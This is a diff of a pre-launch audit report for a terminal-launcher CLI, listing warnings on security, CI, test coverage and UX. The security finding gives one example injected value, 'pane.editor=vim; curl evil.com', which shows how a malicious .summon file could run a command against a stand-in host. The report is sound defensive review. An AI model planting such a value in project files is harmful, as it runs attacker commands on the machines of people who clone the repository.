@@ -1,95 +1,76 @@
 # Pre-Launch Audit Report
-> Generated on 2026-03-17 | Branch: `develop` | 6 parallel specialists | Pre-v1.2.1
+
+> Generated on 2026-03-20 | Branch: `develop` | Commit: `732348c` | 6 parallel specialists
 
 ## Verdict: CONDITIONAL
 
-One expected warning (unpushed commit awaiting release). No blockers. All systems green.
+Zero blockers. 11 warnings across 4 specialists. All are addressable before release.
 
 ## Blockers (must fix before release)
+
 None.
 
 ## Warnings
+
 | # | Issue | Severity | Found by | Risk |
 |---|-------|----------|----------|------|
-| W1 | 1 unpushed commit on `develop` (theme removal hotfix) | medium | devops | Must push before release PR |
-| W2 | Duplicated env-var-name regex in index.ts:422 vs launcher.ts ENV_KEY_RE | low | architect, performance-eng | Logic divergence risk |
-| W3 | Weak `.toBeTruthy()` assertions in setup.test.ts (8 uses) | low | qa-lead | Won't catch type regressions |
-| W4 | launcher.ts branch coverage 91.91% — tree layout + project CWD merge path untested | low | qa-lead | Uncovered runtime path |
-| W5 | `on-start` uses `execSync` (shell mode) — by-design but worth noting | low | security-reviewer | Same trust model as Makefile |
-| W6 | Branch protection `enforce_admins: false` on main | low | devops | Admins can bypass checks |
-| W7 | `--fix` and `--vim` missing from CLI_FLAGS array | low | ux-reviewer | Bash completion gap (zsh OK) |
-| W8 | Unicode arrow `→` in index.ts output without fallback | low | ux-reviewer | Cosmetic; Ghostty renders fine |
-
-## Recommendations
-| # | Suggestion | Found by |
-|---|-----------|----------|
-| R1 | Extract ENV_KEY_RE to shared constant in utils.ts or validation.ts | architect, performance-eng |
-| R2 | Strengthen `.toBeTruthy()` to `.toBeTypeOf('string')` in setup.test.ts | qa-lead |
-| R3 | Add test for tree layout + project CWD merge path (launcher.ts:441-443) | qa-lead |
-| R4 | Consider `--yes`/`--no-confirm` flag for CI automation use cases | security-reviewer |
-| R5 | Split EDITOR validation on first space to allow `code --wait` | security-reviewer |
-| R6 | Document .summon trust model in dedicated README security section | security-reviewer |
-| R7 | Mark all test-only exports with consistent `@internal` JSDoc tag | architect |
-| R8 | Cache `listStarshipPresets()` result for repeated calls | performance-eng |
-| R9 | Enable `enforce_admins` and `dismiss_stale_reviews` on main branch protection | devops |
-| R10 | Add `--fix`/`--vim` to CLI_FLAGS for bash completion consistency | ux-reviewer |
-| R11 | Show effective defaults in `summon config` when no machine config set | ux-reviewer |
+| W1 | Tree layout `pane.*` commands bypass `confirmDangerousCommands()` metacharacter check | WARNING | security-reviewer | Malicious `.summon` files in cloned repos could execute arbitrary commands via `pane.*` without prompting |
+| W2 | `flatted` prototype pollution in dev dependency (eslint chain) | WARNING | security-reviewer | Dev-only; no runtime exposure. Fix via `pnpm.overrides` |
+| W3 | `on-start` uses `execSync` with user input (mitigated by prompt) | WARNING | security-reviewer | Defense-in-depth is prompt-based; acceptable for local CLI |
+| W4 | 3 unpushed commits on `develop` — CI has not validated | WARNING | devops | Push before release to get CI green |
+| W5 | `STARSHIP_CONFIG` env var missing from README env var table | WARNING | devops | Documented in user-manual but not README |
+| W6 | CodeQL workflow does not trigger on PRs to `main` | WARNING | devops | Release PRs skip security analysis |
+| W7 | `summon doctor` only checks 2 Ghostty settings — not comprehensive | WARNING | ux-reviewer | Users expect a full diagnostic |
+| W8 | Bash completion depends on `_init_completion` (not on stock macOS bash) | WARNING | ux-reviewer | Silent failure on macOS default bash |
+| W9 | `ensureCommand` auto-install prompt defaults to Yes | WARNING | ux-reviewer | Hitting Enter triggers `npm install -g` or `brew install` |
+| W10 | `summon open` project selection has no cancel hint | WARNING | ux-reviewer | Minor affordance gap |
+| W11 | `checkAccessibility()` 5000ms synchronous timeout on launch hot path | WARNING | performance-eng | ~100-200ms typical; 5s worst case. Reasonable trade-off |
 
 ## Detailed Findings
 
 ### 1. Quality Assurance (qa-lead) — GREEN
-- **945 tests**, all passing, 0 skipped
-- **Typecheck:** clean, **Lint:** clean
-- **Coverage:** 98.98% statements, 94.12% branches, 98.60% functions, 99.22% lines
-- Critical files all at 98-100% coverage
-- Uncovered: setup.ts SIGINT handler (interactive-only), tree.ts defensive throw, launcher.ts tree+CWD merge branch
-- 8 weak `.toBeTruthy()` assertions in setup.test.ts
 
-### 2. Security (security-reviewer) — GREEN
-- `pnpm audit`: no known vulnerabilities, zero runtime deps
-- No hardcoded secrets found
-- osascript execution uses stdin (`execFileSync` with `input`), not shell args — safe
-- AppleScript escaping (`escapeAppleScript`, `shellQuote`) correctly implemented
-- `confirmDangerousCommands` catches shell metacharacters in `.summon` files
-- `SAFE_COMMAND_RE`, `SAFE_SHELL_RE`, `ENV_KEY_RE` properly guard all injection vectors
-- `layoutPath()` prevents path traversal with resolve+prefix check
-- File permissions: config dir 0o700, files 0o600 — correct
-- All dependency licenses permissive (MIT, Apache-2.0, ISC)
+- **961 tests, 100% pass rate**, 0 failures, 0 skipped
+- Typecheck: clean. Lint: clean. Build: clean.
+- Coverage: 99.29% stmts, 94.88% branches, 98.62% functions, 99.49% lines (all above thresholds)
+- Test-to-source ratio: ~10,500 lines of tests for ~5,300 lines of source
+- 5 recommendations: 2 flaky-test retries (#166), SIGINT handler untestable, tree parser defensive guard, grid preview edge case
+
+### 2. Security (security-reviewer) — YELLOW
+
+- **W1** (most significant): Tree layout `pane.*` commands from `.summon` files flow directly into `wrapForConfig()` without passing through `confirmDangerousCommands()`. A malicious `.summon` in a cloned repo could define `pane.editor=vim; curl evil.com` and it would execute without warning. The existing help text warns users to review `.summon` files, but `editor`/`sidebar`/`shell`/`on-start` keys all get the metacharacter check — `pane.*` should too.
+- **W2**: `flatted` vulnerability — dev-only, no runtime exposure. Fix: `pnpm.overrides` or update eslint.
+- **W3**: `on-start` uses `execSync` by design; mitigated by prompt + non-TTY refusal.
+- No hardcoded secrets. No path traversal. `escapeAppleScript()` and `shellQuote()` are correct. Config files created with proper permissions (0o700/0o600). Dependency licenses all compatible.
 
 ### 3. Infrastructure (devops) — YELLOW
-- Build succeeds (14ms, 75KB total output)
-- CI: all recent runs green on develop
-- CI config: Node [18, 20, 22] matrix, CodeQL, dependency review — solid
-- Package metadata: correct (name, version, bin, files, engines, os, license)
-- Env vars: full parity between documented (5) and used (5)
-- **1 unpushed commit** (theme removal) — expected, will push with release
-- Branch protection on main: required checks + 1 review, but `enforce_admins: false`
+
+- **W4**: 3 unpushed commits. Push and verify CI before release.
+- **W5**: `STARSHIP_CONFIG` env var inconsistency between README and user-manual.
+- **W6**: `codeql.yml` missing `main` in `pull_request.branches`.
+- Build output verified: shebang present, ESM format, no source maps, minified.
+- package.json correct: files/bin/engines/os all valid. Husky hooks properly configured.
 
 ### 4. Architecture (architect) — GREEN
-- Typecheck: clean
-- Dependencies: all up to date
-- No circular dependencies — clean DAG
-- No dead code (test-only exports properly annotated with `@internal`)
-- Module boundaries clean: layout planning → script generation → execution
-- Dynamic imports for heavy modules (setup, completions, keybindings)
-- 1 duplicated regex (ENV_KEY_RE) — minor DRY violation
+
+- Typecheck clean. All dependencies current. No circular dependencies.
+- Import graph is a clean DAG.
+- 5 recommendations: `renderGridBuilderPreview` dead code, duplicated box-drawing logic in preview renderers, `setup.ts` at 1717 lines could split, `readKVFile` should skip `#` comments, `doctor` subcommand inlined in switch-case.
 
 ### 5. Performance (performance-eng) — GREEN
-- Build: 14ms, 75KB total (12 chunks, code-split)
-- Entry chunk: 35KB, setup lazy-loaded (22KB), completions lazy-loaded (6KB)
-- All regexes compiled at module level (constants)
-- String building uses array push + join — optimal
-- Sync file I/O appropriate for one-shot CLI
-- `resolveCommand` results cached in launcher
-- Starship path cached, config dir ensured once
-- No anti-patterns found
 
-### 6. UX/Accessibility (ux-reviewer) — GREEN
-- Help text: all 13 subcommands documented, consistent formatting, practical examples
-- Error messages: consistent `Error: <description>` + actionable guidance pattern
-- Exit codes: 0 (success), 1 (error), 2 (doctor issues), 130 (Ctrl+C) — all correct
-- Setup wizard: handles no-Ghostty, Ctrl+C, invalid input, non-TTY, decline-and-retry
-- NO_COLOR support via `useColor` flag, all ANSI output goes through `wrap()`
-- True color detection with graceful fallback
-- Screen reader compatible (no emoji-only messages)
-- Tab completion: zsh fully working, bash minor gap for subcommand-specific flags
+- Total bundle: ~76KB minified. Reasonable for zero-dep CLI.
+- Code splitting effective: setup wizard (22.6K) and completions (6.3K) lazy-loaded.
+- `summon --help` loads ~45KB with no filesystem I/O at import time.
+- AppleScript generation uses efficient array-push-then-join pattern.
+- **W11**: `checkAccessibility()` adds ~100-200ms per launch (5s worst case). Correctly skipped for `--dry-run`, `--help`, `--version`.
+- `resolvedCache` in launcher prevents duplicate `command -v` lookups. Config reads are minimal (2 small files).
+
+### 6. UX/Accessibility (ux-reviewer) — YELLOW
+
+- **W7**: `summon doctor` checks only `notify-on-command-finish` and `shell-integration`. Should also verify configured editor/sidebar availability, config dir, Ghostty version.
+- **W8**: Bash completion uses `_init_completion` which requires `bash-completion` package (not on stock macOS bash 3.2).
+- **W9**: `ensureCommand` install prompt defaults to Yes — hitting Enter triggers package install.
+- **W10**: `summon open` project selection doesn't hint at Ctrl+C to cancel.
+- Setup wizard is well-designed. Accessibility recovery flow is clear. Color support and `NO_COLOR` properly handled. Error messages are actionable with consistent stderr/stdout separation.
+- 10 recommendations: help text gaps, completion gaps for `freeze`/`export`, on-start error swallowing, minor formatting inconsistencies.
